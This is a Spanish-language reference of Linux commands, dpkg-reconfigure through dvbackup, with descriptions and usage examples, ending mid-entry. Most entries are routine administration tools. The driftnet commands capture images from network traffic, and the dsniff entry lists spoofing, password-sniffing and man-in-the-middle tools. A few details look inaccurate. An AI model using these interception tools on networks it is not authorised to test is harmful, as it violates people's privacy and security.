# dpkg-reconfigure network-manager (reconfigurar un paquete específico)
# dpkg-reconfigure -n nombre_del_paquete (obtener información sobre cómo se configura un paquete específico, sin aplicarla realmente)
# dpkg-reconfigure debconf (reconfigura la interfaz de configuración)
# dpkg-reconfigure xserver-xorg (reconfigura el servidor X)
# dpkg-reconfigure console-common (reconfigura el teclado)
# dpkg-reconfigure console-setup (mismo que lo anterior)
# dpkg-reconfigure locales (reconfigura el lenguaje)
# dpkg-reconfigure tzdata  (reconfigura la zona horaria)
# dpkg-reconfigure console-data (reconfigura las tty)
# dpkg-reconfigure -a (mostrará una lista de todos los paquetes que requieren configuración y permitirá reconfigurarlos uno por uno)
# dpkg-reconfigure fontconfig-config  (reconfigurar fuentes. Seguir con el comando siguiente)
# dpkg-reconfigure fontconfig  (reconfigurar fuentes)


dpkg-repack
Herramienta de archivado de paquetes de Debian. dpkg-repack crea un archivo .deb a partir de un paquete que ya se ha instalado. Este comando resulta particularmente práctico cuando se ha realizado cambios en los archivos de configuración u otros archivos de un paquete instalado y se desea conservar esos cambios en un nuevo paquete que se pueda distribuir o reinstalar en el futuro.
Por ejemplo:
# nano /etc/example-package/config.conf (realizar algunas modificaciones en el archivo de configuración de un paquete y una vez guardado)
# dpkg-repack example-package (creará un archivo llamado example-package_version_arch.deb en el directorio actual, donde version y arch se sustituirán por la versión y la arquitectura del paquete)
# dpkg -i example-package_version_arch.deb (el nuevo paquete se instala de la forma tradicional)


dpkg-www
Interfaz web de administración de paquetes Debian. Puede listar paquetes, mostrar información de los paquetes y los archivos instalados, explorar la documentación y navegar a través de las dependencias de los paquetes. También puede encontrar todos los paquetes propietarios de un archivo o directorio o aquellos que proporcionan un paquete virtual.
$ dpkg-www (abriría una URL de dpkg en el host local que enumeraría todos los paquetes instalados)
$ dpkg-www bash (abriría una URL de dpkg mostrando información sobre el paquete bash
$ dpkg-www depends=coreutils (abriría una URL dpkg que enumera todos los paquetes dependiendo de coreutils)


dq
Herramienta de consulta DNS/DNSCurve utilizada para realizar consultas a servidores DNS o DNSCurve sobre tipos específicos de registros relacionados con un nombre de dominio determinado.
$ dq any example.com (mostrará las direcciones IP asociadas al dominio "example.com")
$ dq ptr 127.0.0.1
$ dq MX example.com (consultar un registro MX [Mail Exchange] de un dominio)
$ dq NS example.como (mostrará los nombreservidores [NS] directamente asociados con "example.com" y seguirá las referencias si existen)


dracut
Crea un initramfs de arranque para paquetes del núcleo de Linux. El initramfs se carga junto con el núcleo y es responsable de montar el sistema de archivos raíz e iniciar el sistema de inicio principal.
$ dracut --list-modules


dradio
Interfaz basada en MPlayer que permite escuchar estaciones de radio y podcasts. Su principal ventaja es que organiza los canales y podcasts disponibles para facilitar la navegación sin necesidad de configuraciones complicadas.
$ dradio (abrirá la interfaz basada en la terminal donde se podrá explorar las estaciones de radio y podcasts disponibles)


drbl
[Diskless Remote Boot en Linux]. Arranque remoto sin disco o sin sistema para máquinas cliente en una red [PXE boot]. Incluye Clonezilla, una utilidad de clonación de particiones y discos.
# drblsrv -i (configurará todo lo necesario, incluyendo DHCP, TFTP, y NFS para que las máquinas cliente puedan arrancar desde la red)
Ejemplo completo de flujo de trabajo:
    - Un servidor DRBL configurado y funcionando.
    - Varias máquinas cliente configuradas para arrancar desde la red.
    - Una vez la máquina cliente arranca desde el servidor DRBL, se carga un sistema operativo temporal.
    - Desde allí, se puede usar Clonezilla para clonar un disco de una máquina fuente a una máquina de destino que también puede arrancar desde la red.


driftnet
Herramienta que se utiliza para capturar y mostrar imágenes como JPEG, GIF, PNG que se transmiten a través de una red. Funciona escuchando el tráfico de red y extrayendo imágenes de los flujos de datos TCP que detecta.
# driftnet -i eth0 (abrirá una ventana donde se mostrarán las imágenes que driftnet capture en tiempo real)
# driftnet -i eth0 -d /ruta/al/directorio (guardará todas las imágenes capturadas en el directorio especificado)
# driftnet -i eth0 -b (seguirá capturando imágenes, pero no las mostrará en una ventana)
# driftnet -i eth0 -p 80 (limitará la captura de imágenes solo al tráfico que pasa por el puerto 80)
# driftnet -i wlan2


driverctl
Herramienta de control de controladores de dispositivos para Linux para manipular e inspeccionar las opciones de controladores de dispositivos del sistema [USB, PCI, entre otros]. Los dispositivos normalmente se asignan a su único controlador de kernel designado de forma predeterminada.
$ driverctl list-devices (dispositivos del sistema actualmente conectados y reemplazables en un bus, pci de manera predeterminada, junto con sus controladores actuales)
$ driverctl -v list-devices | grep r8169 (información sobre una en concreto)
$ driverctl list-devices network (los relacionados con network)


driverless
Lee el fichero /usr/lib/cups/driver/ para enumerar las impresoras sin controlador disponibles.
$ driverless list (listado)


drm-info
Vuelca información sobre dispositivos DRM disponibles, como dispositivos, planos, codificadores, CRTC y conectores disponibles y sus propiedades DRM.
$ drm_info


droid-juicer
Este paquete proporciona un servicio de arranque para extraer firmware binario de particiones de proveedores en dispositivos Android. Está pensado para ejecutarse en el primer arranque y activa un reinicio una vez que se ejecuta correctamente, lo que garantiza que el dispositivo se ejecutará con todo el firmware necesario disponible para Linux. Este tipo de herramienta es útil en dispositivos que requieren firmware propietario para que ciertas funciones, como gráficos, redes inalámbricas o módems, funcionen correctamente en Linux.
$ systemctl status droid-juicer.service (verificar si el servicio está habilitado)
# systemctl start droid-juicer.service (forzar la ejecución manual del servicio y volverá a ejecutar el proceso de extracción del firmware)
# journalctl -u droid-juicer.service (permitirá ver los registros generados por droid-juicer durante su ejecución, para verificar qué firmware fue extraído o si hubo algún error)
$ ls -l /lib/firmware/droid-juicer/ (listar el firmware extraído que suelen guardar en /lib/firmware)
# droid-juicer --no-reboot (ejecutar la extracción sin forzar el reinicio del dispositivo)
# systemctl disable droid-juicer.service (desactivarlo para evitar que se ejecute nuevamente)


droidlysis
Herramienta utilizada para analizar aplicaciones Android (APKs) y extraer información relevante de ellas. Esta herramienta automatiza el proceso de desmontaje de la aplicación y busca diversas propiedades dentro del paquete APK o su código desmontado. Puede identificar patrones sospechosos o potencialmente maliciosos en el código o en la configuración de la aplicación.
$ droidlysis -i archivo.apk (desmontará el APK y generará un informe con las propiedades encontradas)
$ droidlysis -i archivo.apk -o ruta/al/directorio/salida (guardará todos los archivos generados, incluyendo el informe, en el directorio especificado)
$ droidlysis -i ruta/al/archivo.apk --permissions (buscar propiedades específicas dentro del APK)
$ droidlysis -i ruta/al/archivo.apk --security (identificar posibles problemas de seguridad como comportamientos maliciosos o vulnerabilidades conocidas)
$ droidlysis -i ruta/al/archivo.apk --json ruta/al/informe.json (creará un archivo JSON con toda la información extraída del APK)


drool
Puede reproducir el tráfico DNS de los archivos de captura de paquetes (PCAP) y enviarlo a un servidor específico, con opciones como manipular el tiempo entre paquetes, así como repetir los paquetes infinitamente o durante una cantidad determinada de iteraciones. El objetivo de esta herramienta es realizar pruebas de rendimiento o simulación de tráfico DNS real.
$ drool -q -f captura.pcap -s 192.168.1.10 (en modo silencioso, sin mostrar salida en la terminal con el archivo captura.pcap y reproduce las consultas DNS contenidas en él hacia el servidor DNS en 192.168.1.10)
$ drool -f captura.pcap -s 8.8.8.8 -i 5 (reproduce el tráfico DNS del archivo captura.pcap cinco veces hacia el servidor DNS 8.8.8.8)
$ drool -f captura.pcap -s 192.168.0.1 -i 0 (reproduce el archivo captura.pcap en bucle infinito hacia el servidor DNS en 192.168.0.1)
$ drool -f captura.pcap -s 1.1.1.1 -t 100 (reproduce el tráfico de captura.pcap hacia el servidor 1.1.1.1, introduciendo un retraso de 100 ms entre cada paquete)
$ drool -f consulta.pcap -s 127.0.0.1 -p 5353 (envía el tráfico DNS del archivo consulta.pcap al servidor en 127.0.0.1 usando el puerto 5353)
1.-
Combinar con tcpdump para capturar y reproducir tráfico:
# tcpdump -i eth0 port 53 -w dns_trafico.pcap (captura todo el tráfico DNS en la interfaz eth0 y lo guarda en dns_trafico.pcap)
# drool -f dns_trafico.pcap -s 8.8.4.4 -i 2 (reproduce el tráfico capturado en el archivo dns_trafico.pcap dos veces hacia el servidor 8.8.4.4)


droopy
Mini web server para recibir archivos.
$ mkdir fotos (crear el directorio donde recibir las imagenes que nos han de enviar)
$ cd fotos
$ droopy -m "Buenassssss, puedes enviarme las fotos que quieras" -p ~/gnu.png -d ~/imagenes (con el texto que queremos [m], ilustrado con la imagen deseada [p] y que lo que nos envien se guarde en la carpeta especificada [d])
Accedemos en local con la dirección http://localhost:8000 y en remoto han de acceder, si no tenemos nombre de host registrado, con http://nuestra_ip:8000/fotos


dropbear
Ofrece tanto funcionalidades de servidor como de cliente SSH, está diseñado para ser lo suficientemente pequeño como para utilizarse en entornos con poca memoria y permite conexiones seguras sobre protocolo TCP o UDP.
# systemctl enable dropbear (configurarlo para arrancar automáticamente al iniciar el sistema)
# ssh root@ip_del_servidor -p 22 (conexión)
# dropbearctl disconnect <ID_DEL_CLIENTE> (desconectar un cliente específico)
# dropbearctl connections (verificar conexiones activas)


dropbox
Almacenamiento en la nube. Linea de comandos para el servicio Dropbox.
$ dropbox status (Muestra el estado actual del demonio)
$ dropbox help update (Muestra información sobre el comando que se especifique)
$ dropbox puburl archivo (Muestra una URL de "archivo" para compartir)
$ dropbox stop (Para el servicio)
$ dropbox running (Comprobar si está activo el demonio)
$ dropbox update (Descargar la última versión de dropbox)
$ dropbox start (Arranca el servicio)
$ dropbox start -i (Arranca el servicio e instala el demonio dropboxd si no está disponible en el sistema)
$ dropbox filestatus -l -a directorio (Lista los archivos del directorio especificado incljuso los ocultos)
$ dropbox filestatus fichero (Muestra el estado del fichero)
$ dropbox autostart (Si respondemos "n" dropbox no se iniciará automáticamente al iniciar la sesión. Por defecto "y": si)
$ dropbox exclude list (Muestra los directorios excluidos de la sincronización)
$ dropbox exclude add dir1 (Excluir un directorio de la sincronización)
$ dropbox exclude add dir1 dir2 (Excluir varios directorios)
$ dropbox exclude remove dir1 (Elimina un directorio de la lista de exclusión)
$ dropbox lansync (Por defecto usa sincronización LAN. Si respondemos "n" no la usará)
1.-
Activar la carpeta "Public" en nuestra cuenta. Visitar la siguiente dirección web <https://www.dropbox.com/enable_public_folder>
Tras la confirmacón aparecerá en nuestra cuenta de Dropbox.


droppy
Mini servidor web cuyo único propósito es permitir que otros carguen archivos a tu computadora. El proceso es:
   $ mkdir ~/descargas (crear directorio donde irá lo que envien)
   $ cd descargas (entrar en el directorio)
   $ droopy -m "Buenas, soy GNU, ¿quieres subir alguna cosa?." -p /home/pep/Imatges/gnu1.png (lanzar droppy con el texto y la imagen que veran en la web)
Para comprobar si el sistema está en servicio, en el navegador colocar la dirección http://localhost:8000 y haciendo clic en "Discover the address of this page" [Descubre la dirección de esta página] se informa la ip donde enviar las fotos.


dropwatch
Herramienta para detectar y diagnosticar dónde se están perdiendo paquetes en una red.
# dropwatch (comenzar a monitorear el tráfico de red y registrar los paquetes que se envían y reciben)
# dropwatch -i eth0 -o salida (que solo escuche el tráfico en la interfaz eth0 y lo guarde en salida)
# dropwatch -f 'tcp' (que solo muestre los paquetes de tipo TCP)


drraw
Interfaz web ligera diseñada para visualizar gráficas generadas a partir de bases de datos RRD [Round Robin Database] que contienen datos de series temporales. Se utiliza para monitorear y presentar datos como: Temperaturas de servidores, uso de la red [ancho de banda], carga del procesador y uso del disco. drraw estará disponible en el navegador en http://localhost/drraw


drslib
Herramientas para usar la API de Python DRSLIB [Data Reference Syntax], utilizadas principalmente en el ámbito de datos climáticos y científicos. Estas herramientas permiten trabajar con datos del CMIP [Coupled Model Intercomparison Project] para garantizar que sigan las convenciones de DRS, traducir entre versiones del protocolo y verificar estructuras de datos en servidores THREDDS. Las herramientas son: drs_checkthredds, drs_tool y translate_cmip3
$ drs_checkthredds http://example.com/thredds/catalog.xml (verifica la estructura de un catálogo THREDDS [Thematic Real-time Environmental Distributed Data Services] para garantizar que los datos cumplan con las reglas DRS)
$ drs_tool validate /data/cmip5/output1/INM/inmcm4/historical/mon/ocean/Omon/r1i1p1/ (verifica si la ruta cumple con la convención DRS para datos CMIP5)
$ drs_tool generate /data/raw_data.nc (generar una ruta DRS para un archivo específico)
$ drs_tool rename /data/raw_data.nc (renombrar un archivo para cumplir con las convenciones DRS)
$ translate_cmip3 /data/cmip3/INM/inmcm3/experiment1/ (traduce nombres y estructuras de archivos del proyecto CMIP3 al formato CMIP5)


dselect
Paquete obsoleto sustituido por aptitude.


dsh
Ejecuta un comando específico simultaneamente en un grupo de computadoras usando métodos de shell remotos como rsh o, el recomendable ssh por razones de seguridad.
$ dsh echo "Linux es un sistema genial" (imprimirá la frase en cada uno de los nodos conectados)
$ dsh read password (solicitará una contraseña a cada nodo y la devolverá como salida)
$ dsh -w hosts.txt "ls -l" (especifica un archivo de hosts llamado "hosts.txt" donde se encuentran las direcciones IP o nombres de host de los nodos objetivo)
$ dsh -rsh "uptime" (usa rsh como protocolo de conexión por defecto)


dsniff
Varias herramientas para rastrear el tráfico de red en busca de inseguridades. Este paquete contiene varias herramientas para escuchar y crear tráfico de red: arpspoof [envía respuestas arp no solicitadas y posiblemente falsificadas], dnsspoof [falsifica respuestas a consultas de direcciones DNS/punteros arbitrarios en la red de área local], dsniff [rastreador de contraseñas para varios protocolos], filesnarf [guarda archivos seleccionados rastreados del tráfico NFS], macof [inunda la red local con direcciones MAC aleatorias], mailsnarf [rastrea correo en la LAN y lo almacena en formato mbox], msgsnarf [graba mensajes seleccionados de diferentes mensajeros instantáneos], sshmitm [intermediario de SSH que rastrea el tráfico SSH], sshow [analizador de tráfico SSH], tcpkill [elimina conexiones TCP en curso especificadas], tcpnice [reduce la velocidad de conexiones TCP especificadas mediante modelado de tráfico "activo"], urlsnarf [genera URL seleccionadas rastreadas del tráfico HTTP en CLF], webmitm [intermediario HTTP/HTTPS. Hace de proxy transparente] y webspy [envía URL rastreadas desde un cliente a su navegador local, requiere tener instalado libx11-6]


dstat
Monitor  de trafico de red
# dstat (uso básico)
# dstat -c --top-cpu -dn --top-mem (uso de CPU, proceso que más usa la CPU, estadistica de disco y red y proceso que consume más memoria)


dt
Herramienta para mostrar información sobre un dominio.
$ dt -debug google.com
$ dt -scan google.com (más información de los registros)
$ dt -json google.com (resultado en json)


dtach
Pequeño programa que emula las funciónes de separar y adjuntar de screen [ver] sin embargo, no tiene las otras características de screen, como su compatibilidad con múltiples terminales o su compatibilidad con emulación de terminal.
$ dtach -n session_1 (crear una sesión. "exit" para dewsconectar)
$ dtach -r session_1 (reconectar a la sesion)
Nota.- Las sesiones persisten incluso después de reiniciar el sistema.


dtdinst
Convierte DTD [Document Type Definition - Definición de Tipo de Documento] en formato de instancia XML [eXtensible Markup Language - Lenguaje de Marcado eXtensible]. Específicamente, convierte las definiciones de entidades y elementos del DTD [Document Type Declaration - Declaración de Tipo de Documento] a su representación en un archivo de instancia XML. Esto facilita trabajar con los datos de la estructura DTD como si fueran parte de un archivo XML estándar. La instancia XML puede tener un formato específico de DTD o un formato RELAX NG [lenguaje de esquema para XML].
Por ejemplo, un DTD puede tener esta estructura:
      <!ELEMENT libro (titulo, autor, fecha)>
      <!ELEMENT titulo (#PCDATA)>
      <!ELEMENT autor (#PCDATA)>
      <!ELEMENT fecha (#PCDATA)>
Esto define que un elemento <libro> debe contener obligatoriamente los elementos <titulo>, <autor> y <fecha>.
$ dtdinst archivo.dtd (generará un archivo XML que representa el contenido del DTD)
Un ejemplo práctico, supongamos que se tiene el siguiente archivo libro.dtd:
      <!ELEMENT biblioteca (libro+)>
      <!ELEMENT libro (titulo, autor, fecha)>
      <!ELEMENT titulo (#PCDATA)>
      <!ELEMENT autor (#PCDATA)>
      <!ELEMENT fecha (#PCDATA)>
      <!ATTLIST libro id ID #REQUIRED>
$ dtdinst libro.dtd (generará libro.dtd.xml que representa la estructura definida en el DTD)
El archivo xml resultante podría verse así:
      <dtd>
        <element name="biblioteca">
          <content type="element" model="libro+"/>
        </element>
        <element name="libro">
          <content type="element" model="(titulo, autor, fecha)"/>
          <attribute name="id" type="ID" use="required"/>
        </element>
        <element name="titulo">
          <content type="#PCDATA"/>
        </element>
        <element name="autor">
          <content type="#PCDATA"/>
        </element>
        <element name="fecha">
          <content type="#PCDATA"/>
        </element>
      </dtd>


dte
Editor de texto por consola mínimo.
$ dte


dtrx
Descompresor de archivos comprimidos en varios formatos [ tar, zip, rpm, deb, gem, 7z, cpio, rar, bzip2, gzip...]
$ dtrx -r archivo.zip (descomprimir de forma recursiva el zip y todos los comprimidos de su interior)
$ dtrx -l archivo.zip (Lista los archivos de archivo zip)


du
Mostrar el espacio usado por los directorios
$ du -a (Para todos los ficheros, no solo los directorios)
$ du -h (Da los resultados en M y G, por defecto son en bytes)
$ du -s (Muestra los totales del directorio o archivo especificados)
$ du -x (Calcular tamaño sin sumar los puntos de montaje)
$ du fichero (Muestra el tamaño de fichero)
$ du | sort -rn | head (Mostrar los 10 archivos que más ocupan)
$ du -sch .[!.]* * | sort -h (Mostrar también las carpetas ocultas y ordenar el resultado)


duc
[libncursesw5-dev libcairo2-dev libpango1.0-dev build-essential]. Herramienta que permite examinar el contenido de nuestro disco. Esta herramienta genera una base de datos con la cual podemos analizar mejor el contenido almacenado.
# duc index /etc (generar la base de datos del directorio /etc)
# duc ls -Fg /etc (ver el contenido y el peso de cada carpeta del directorio del que se ha creado la base de datos)
# duc gui /etc (mostrarlo de forma gráfica)
# duc graph (muestra un gráfico del presente directorio con el nombre duc.png)


duck
Verificador d'URL de Debian. Procesa diversos campos de los ficheros debian/control, debian/upstream, debian/copyright, debian/patches/* y systemd.unit y comprueba si las URLs, los enlaces VCS y los dominios de direcciones de correo electrónico que se encuentran en ellos son validosd'.
$ duck -v


duckduckgo
Buscador alternativo que respeta la privacidad del usuario.
Filtros:
	site:lapipaplena.net (Busca en la url especificada)
	qrcode "linux es un sistema genial" (Crear código QR de un texto)
	md5 lapipaplena (Generar un hash de un texto en md5)
	base64 encode "Un texto" (Generar un hash en base64)
	anagram "linux es genial" (Generar un anagrama [cambio de posición de los carácteres)
	shorten http://lapipaplena.net (Acortador de URL)
	maps ibiza (Muestra el mapa solicitado)
	@templix (De un usuario de twitter)
	recipes "tortilla de patatas" (Recetas de cocina)
	color codes (Muestra los códigos de los colores)
Algunos comandos para utilizar en buscadores externos [Bangs]
	!wes (Busca en la wikipedia en español)
	!github (En github)
	!b (En bing)
	!meneame (En meneame)
	!tw (En twitter)
	!fb (En facebook)
	!flickr (En flickr)
	!grooveshark (En grooveshark)
	!y (En yahoo)
	!enes (En google translate inglés-español)
	!gplus (En google+)
	!g (En google)
	!gi (En google images)
	!m (En google maps)
	!gmail (En gmail)
	!ebay (En ebay)
Algunos atajos:
	d (Busca más resultados en el sitio web resaltado)
	Ctrl+enter (Abre resultado en una nueva ventana)
	Ees (Sale de la caja de búsqueda y va a los resultados)
	h (Coloca el cursor en la caja de búsqueda)
	r (Si existe, va a los relacionados)
	s (Si existe, va al enlace sugerido
	t (Va al inicio de la página)


ducktype
Sintaxis liviana no XML para Mallard, sistema de documentación diseñado para ayudar a los usuarios a encontrar respuestas de manera rápida e intuitiva], con un lenguaje de marcado orientado a archivos de ayuda principalmente de GNOME.
$ ducktype ayuda.txt -o ayuda.page (convertir un archivo .txt escrito en sintaxis Ducktype a formato Mallard)
$ ducktype --validate ayuda.txt (revisará el archivo y mostrará posibles errores en la sintaxis)


duf
Ver espacio de disco ocupado. Como df más colorida. Descarga:
$ wget https://github.com/muesli/duf/releases/download/v0.3.1/duf_0.3.1_linux_amd64.deb
# dpkg -i duf_0.3.1_linux_amd64.deb
$ duf -hide-special (lanzar la aplicación)
$ duf (mostrando dispositivos locales y especiales)
$ duf -theme ansi (con determinado tema)
$ duf -all (incluir atributos de todas las perticiones)


duff
Buscar archivos duplicados.
$ duff -a (De forma recursiva en todo el presente directorio)
$ duff -r Documentos (Especificando un directorio)


dump
Copia de seguridad de archivos, directorios o particiones. Para restaurar la copia de seguridad ver comando “restore”.
$ dump -0vf home.bak /home/usuario/ (Completo [0], incremental sería 1, mostrando información [v] y especificando fichero [f]


dump-acct
Imprime una lista de todos los inicios de sesión. La lista está, generalmente, en /var/log/wtmp. Todos los campos estan separados por una linea vertical y son: user, name, tty, type, id, pid, hostaddr, host, time.
# dump-acct /var/log/wtmp
# dump-acct -n 10 /var/log/wtmp (solo imprimir en pantalla 10 lineas)


dump.exfat
Imprime información de un dispositivo dado que está formateado por el sistema de archivos exFAT.
# dump.exfat /dev/sda3


dumppdf
Vuelca el contenido interno de un archivo PDF a formato pseudo-XML.
$ dumppdf -a file.pdf (Volcar todos los encabezados y contenidos, excepto los objetos de flujo)
$ dumppdf -T file.pdf (Volcar la tabla de contenido)


dumpe2fs
Muestra información de ficheros ext2/3
# dumpe2fs /dev/sda1
Nota.- El porcentaje de bloques reservados para el usuario root en los sistemas de archivo ext2/3 normalmente es de un 5%. Esta cifra se obtiene de los datos “Reserved block count” y “Block count”. Con tune2fs podemos modificar este porcentaje, por ejemplo al 1%:
# tune2fs -m 1 /dev/sda1


dumpet
Herramienta para depurar imágenes de arranque de El Torito. Puede volcar la estructura de El Torito en varios formatos de salida. El-Torito es un estándar para crear medios de arranque como CD-ROM, DVD o BD compatibles con sitemas BIOS.
$ dumpet imagen.iso (proporcionará detalles sobre la estructura de la imagen, incluyendo secciones como el sector de arranque y las entradas de menú)
$ dumpet -s 0x20 mi_imagen.iso (extraerá y mostrará información sobre el sector 0x20 de la imagen)


dumpkeys
Permite obtener el mapa de teclas (Keymap) utilizado por el controlador de teclado actual.
# dumpkeys -i
# dumpkeys -f (completo)


duplicity
Copia de seguridad cifrada e incremental que solo registra las partes de los archivos que han cambiado desde la última copia de seguridad.
$ duplicity full /home/user/docs file:///mnt/backup (copia de seguridad completa de la carpeta /home/user/docs y la almacena en /mnt/backup, cifrando los datos)
$ duplicity --encrypt-key "CLAVE_GPG" /home/user/docs file:///mnt/backup (especificar una clave GPG para cifrar la copia de seguridad)
$ duplicity full /home/me sftp://uid@other.host/some_dir
$ duplicity incr /home/user/docs file:///mnt/backup (realizar copia incrementales)
$ duplicity restore file:///mnt/backup /home/user/docs_restaurado (restaurar la copia de seguridad en su ubicación original)
$ duplicity restore --file-to-restore documento.txt file:///mnt/backup /home/user/docs_restaurado/documento.txt (restaurar un archivo específico)
$ duplicity verify file:///mnt/backup /home/user/docs (asegurar que los archivos respaldados están intactos)
$ duplicity list-current-files file:///mnt/backup (ver qué archivos están almacenados)



dupload
Cargar automáticamente paquetes Debian a un host remoto, generalmente un repositorio de Debian o un servidor de mantenimiento.
$ dupload --to mydebianrepo paquete.changes (subirá los archivos especificados en paquete.changes al servidor mydebianrepo)
$ dupload -t scp://usuario@servidor:/var/incoming paquete.changes (usando scp para enviar los archivos directamente a /var/incoming en servidor)
$ dupload --dry-run paquete.changes (mostrar lo que haría dupload sin realmente transferir archivos)
$ dupload --force paquete.changes (subir un paquete y omitir la confirmación interactiva)


duply
Interfaz de shell para duplicity [ver] que simplifica el uso al administrar las configuraciones para cada trabajo de respaldo en perfiles. Admite todos los backends de duplicity.



durep
Monitorear el uso del disco. Genera una salida con texto y barras gráficas.
$ durep /var/www (uso básico)
$ durep -td 2 (hasta una profundidad de 2 subdirectorios del directorio actual)
$ durep -f /var/www/html (escanear solo archivos sin descender a directorios)
$ durep -c /var -sf /var/lib/durep/(generando un archivo .cds de /var y guardarlo en el directorio especificado)
$ durep -lf /var/lib/durep/durep.cds (cargar los resultados del archivo)


dust
Mostrar espacio usado por archivos y directorios. Como du más colorido.
$ dust (forma básica)
$ dust -i (sin archivos ocultos)
$ dust -p (mostrar rutas completas)
$ dust -b (sin mostrar porcentages)
$ dust -x avi (sin mostrar los que contengan avi en su nombre)


dutree
Analisis del uso del disco duro en forma de arbol. De forma predeterminada, dutree muestra un tamaño de archivo de 1 M
$ dutree (forma básica)
$ dutree -s -H (resumen completo y sin mostrar archivos ocultos)
$ dutree -u (ver el uso real del disco duro en lugar del tamaño del archivo)
$ dutree -d 3 (hasta una profundidad de 3 subdirectorios)
$ dutree -f (omitiendo directorios)
$ dutree -a (ver incluso los de menor tamaño que 1 M)


dvd+rw-format
Formatear dvd +- Rw
$ dvd+rw-format -force /dev/cdrom


dvd-rw-tools
Herramientas que permiten grabar imágenes de DVD creadas por dvdauthor o genisoimage en discos DVD+R, DVD+RW, DVD-R y DVD-RW. Este paquete contiene dvd+rw-mediainfo [para brindar detalles sobre los discos DVD], Depende del paquete growisofs [ver]. Incluye las herramientas btcflash, dvd+rw-booktype, dvd+rw-mediainfo y dvd-ram-control
$ btcflash -v (muestra la versión actual del firmware de la unidad.)
$ btcflash -u firmware.bin (actualiza el firmware de la unidad con el archivo firmware.bin. Se debe tener cuidado al actualizar el firmware, ya que un error podría dejar inutilizable la unidad)
$ dvd+rw-booktype -dvd-rom /dev/sr0 (cambia el "book type" de un DVD+R a "DVD-ROM")
$ dvd+rw-mediainfo /dev/sr0 (muestra información sobre el disco insertado en /dev/sr0, incluyendo el estado de grabación, la capacidad y los espacios usados/libres)
$ dvd-ram-control --status /dev/sr0 (muestra el estado actual del disco DVD-RAM.)
$ dvd-ram-control --disable-defect /dev/sr0 (desactiva la gestión de defectos en un disco DVD-RAM)


dvd-slideshow
conjunto de herramientas para crear presentaciones de diapositivas en DVD con menús. DVD Slideshow consiste en un conjunto de herramientas que permiten crear videos estilo presentaciones de diapositivas a partir de una colección de imágenes. Este paquete proporciona los siguientes programas: dir2slideshow, dvd-slideshow, dvd-menu, gallery1-to-slideshow y jigl2slideshow.
El archvio de configuración, básico y basado en la página man podria ser:
$ nano ~/.dvd-slideshow/dvd-slideshowrc
       debug=1 # 0 (bajo) a 3 (mucha información)
       pal=0 # 0=ntsc 1=pal
       ac3=1 # 0=mp2 1=ac3 audio
       copy=0 # agregar copias de las imágenes originales al directorio de salida
       high_quality=0 # usar el modo de alta calidad (establecido en 1)
       autocrop=1 # recortar automáticamente las imágenes para llenar la pantalla completa
       border=0 # agregar un borde de N píxeles entre la imagen y el borde del DVD
       sharpen=0 # habilitar el enfoque de imagen para todas las imágenes
       widescreen=0 # usar el modo de pantalla ancha (16:9) en lugar de 4:3
       #
       ## Fuente predeterminada:
       font=/usr/share/fonts/default/Type1/n019004l.pfb # Fuente URW en negrita helvética
       #
       ## Subtítulo: subtitle_type="dvd" # use "render" para forzar la representación del texto.
       subtitle_font_size=24
       subtitle_font='/usr/share/fonts/type1/texlive-fonts-recommended/putbi8a.pfb' # Fuente URW en negrita helvética
       subtitle_color="white"
       subtitle_outline_color="black"
       subtitle_location="bottom" # inferior
       subtitle_location_x=0
       subtitle_location_y=105
       #
       ## Título:
       title_font_size=48
       title_font_color="black" # o use hexadecimal "#RRGGBB"
       title_font='/usr/share/fonts/type1/texlive-fonts-recommended/putbi8a.pfb' # Fuente URW en negrita helvética
       #
       ## Título superior:
       toptitle_font_size=48
       toptitle_font_color="black" # o use el valor hexadecimal "#RRGGBB"
       toptitle_bar_height=125 # 0 para que no haya un 50 % de blanco detrás del texto
       toptitle_text_location_x=80
       toptitle_text_location_y=50
       #
       # Título inferior:
       bottomtitle_font_size=36
       bottomtitle_font_color="black" # o use el valor hexadecimal "#RRGGBB"
       bottomtitle_bar_location_y=156 # relativo a la parte inferior de la imagen
       bottomtitle_bar_height=55 # 0 para que no haya un 50 % de blanco detrás del texto
       bottomtitle_text_location_x=0
       bottomtitle_text_location_y=155
       #
       # kenburns:
       kenburns_acceleration=1 # segundos de aceleración lenta para kenburns
       # use 0 para que no haya aceleración o use un porcentaje del tiempo del efecto:
       # kenburns_acceleration=25% # acelerará durante el primer 25% del efecto.
$ dir2slideshow -t 3 -c 1 -n Vacaciones -s "año 2024" imagenes/ (tiempo imagen en pantalla, tiempo transicion entre imágenes, titulo, subtitulo y directorio fotos)
Este comando creará el archivo Vacaciones.txt que puede editarse y modificar y cada vez que se realicen modificaciones en este archivo o en el de configuración ha de lanzarse;
$ dvd-slideshow -o Vacaciones -n Vacaciones -a musica.ogg -f Vacaciones.txt (con la música de la presentación y archivo salido del comando anterior)
$ vlc "presen/Vacaciones.vob" (ver representación)


dvb-tools
Herramientas para trabajar con dispositivos de televisión digital [DVB, Digital Video Broadcasting]. Estas herramientas son útiles para probar, configurar y manipular dispositivos DVB, como sintonizadores de TV, y para realizar tareas como escanear canales, ajustar parámetros de sintonización, y convertir formatos de datos.
$ dvb-fe-tool (mostrará información sobre el frontend del dispositivo DVB, como el estado del sintonizador, la frecuencia actual, el ancho de banda, y otros parámetros)
$ dvb-fe-tool -i (mostrará información más detallada sobre el frontend, incluyendo capacidades y parámetros actuales)
$ dvb-format-convert -i input_file -o output_file (convierte el archivo de entrada input_file al formato de salida output_file)
$ dvbv5-scan /usr/share/dvb/dvb-t/es -o channels.conf (escaneará los canales de televisión digital terrestre [DVB-T] en España y guardará la lista de canales encontrados en el archivo channels.conf)
$ dvbv5-scan -f 546000000 -b 8 -o channel.conf (escaneará la frecuencia 546 MHz con un ancho de banda de 8 MHz y guardará los resultados en channel.conf)
$ dvbv5-zap -c channels.conf -a 0 -n "Canal 1" (sintonizará el canal llamado "Canal 1" en el archivo channels.conf y lo mostrará en el dispositivo de salida)


dvbackup
Herramienta que permite realizar copias de seguridad utilizando videocámaras MiniDV. Esta herramienta utiliza el formato de video digital [DV] para almacenar datos en la cinta de la videocámara, lo que permite aprovechar el hardware de la cámara como un medio de almacenamiento. El sistema y la videocámara deben estar conectados a través de IEEE1394, también conocido como Firewire, iLink. Para llevar los datos a la cinta, se debe utilizar una utilidad adicional, llamada dvconnect, que está incluida en libdv-bin.
$ find . | cpio -o -H crc | dvbackup --prefix=125 | dvconnect -s (Presiona el botón de grabar en tu videocámara)
$ find . | cpio -o -H crc | dvbackup --prefix=125 | dvconnect -s -b 500 (caso de que el anterior comando no funcione)
Detenina la videocámara y rebobinada, reproducir la cinta y lanzar:
